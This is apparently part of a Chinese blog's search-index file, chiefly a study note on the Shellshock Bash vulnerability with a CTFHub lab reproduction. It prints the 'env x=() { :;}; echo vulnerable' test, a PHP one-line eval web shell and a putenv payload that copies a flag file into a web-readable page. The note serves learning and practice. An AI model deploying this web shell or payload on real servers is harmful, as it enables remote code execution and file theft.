command3</code></pre><p>每个命令将按顺序执行，不管前一个命令是否成功。无论前一个命令的返回状态码是什么，都会继续执行下一个命令。</p></li></ol><p>这些符号在命令行中有不同的作用，你可以根据需要选择适当的符号来控制命令的执行顺序和方式。</p>]]></content>
      
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellshock</title>
      <link href="/2023/06/11/shellshock/"/>
      <url>/2023/06/11/shellshock/</url>
      
        <content type="html"><![CDATA[<h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><p><a href="https://zhuanlan.zhihu.com/p/35579956">什么是shellshock攻击：</a></p><p>​背景：环境变量和bash</p><p>​</p><p>​触发：</p><ol><li>产生新的bash</li><li>通过环境变量传递</li><li>环境变量以<code>() &#123;&#125;</code>这样的形式</li></ol><pre><code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;vulnerablethis is a test</code></pre><p><code>env</code>可以创建临时环境变量.</p><p><code>bash -c</code>可以运行一个shell命令.</p><p>当shell返回“vulnerable”时说明函数申明后的echo函数被执行（漏洞是因为Bash初始化时调用了<code>builtins/evalstring.c</code>里的<code>parse_and_execute//类似于eval</code>函数。）</p><span id="more"></span><p>原理:</p><p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞,&#x3D;&#x3D;启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。&#x3D;&#x3D;</p><p>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</p><p>HTTP协议的头User-Agent通常是通过环境变量<code>HTTP_USER_AGENT</code>来传递的。</p><p>复现：CTFHUB</p><p><img src="/./233.png" alt="23.png"></p><p>C:\Users\Administrator\Desktop</p><p>上传代码并访问：shell.php</p><pre><code>&lt;?php  @eval($_REQUEST[&#39;ant&#39;]);  putenv(&quot;PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/test.php&quot;);  error_log(&quot;admin&quot;,1);  //mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;</code></pre><p>通过<code>putenv</code>来设置环境变量，默认<code>putenv</code>定义的环境变量名必须以PHP_开头。</p><pre><code>当前用户的环境变量配置文件主要有.bashrc和.profile，~/.profile可以设定本用户专有的路径、环境变量等，它只能登入的时候执行一次；~/.bashrc也是某用户专有设定文档，可以设定路径，命令别名，每次shell脚本的执行都会使用它一次。简单的说，.profile只在会话开始时被读取一次，而.bashrc则每次打开新的终端时，都会被读取。</code></pre><p>由上可知想要变量被执行我们需要启动一次shell。</p><p>我们通过putenv函数设置环境变量后执行一个error_log()函数会在执行sh -c -t -i触发payload。</p><p>根据代码在test.php中可以读取到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
